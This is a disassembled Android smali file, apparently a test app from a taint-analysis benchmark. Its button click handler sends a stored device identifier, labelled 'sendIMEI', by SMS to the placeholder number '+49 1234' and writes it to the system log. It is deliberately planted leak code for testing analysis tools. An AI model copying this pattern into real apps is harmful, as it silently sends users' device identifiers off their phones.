.class Lde/ecspride/Button2$1;
.super Ljava/lang/Object;
.source "Button2.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lde/ecspride/Button2;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lde/ecspride/Button2;


# direct methods
.method constructor <init>(Lde/ecspride/Button2;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lde/ecspride/Button2$1;->this$0:Lde/ecspride/Button2;

    .line 29
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 6
    .param p1, "v"    # Landroid/view/View;

    .prologue
    const/4 v2, 0x0

    .line 33
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 34
    .local v0, "sm":Landroid/telephony/SmsManager;
    const-string v1, "+49 1234"

    .line 35
    .local v1, "number":Ljava/lang/String;
    iget-object v3, p0, Lde/ecspride/Button2$1;->this$0:Lde/ecspride/Button2;

    invoke-static {v3}, Lde/ecspride/Button2;->access$0(Lde/ecspride/Button2;)Ljava/lang/String;

    move-result-object v3

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 36
    const-string v3, "TAG"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "sendIMEI: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, p0, Lde/ecspride/Button2$1;->this$0:Lde/ecspride/Button2;

    invoke-static {v5}, Lde/ecspride/Button2;->access$0(Lde/ecspride/Button2;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 38
    iget-object v3, p0, Lde/ecspride/Button2$1;->this$0:Lde/ecspride/Button2;

    invoke-static {v3, v2}, Lde/ecspride/Button2;->access$1(Lde/ecspride/Button2;Ljava/lang/String;)V

    .line 39
    return-void
.end method
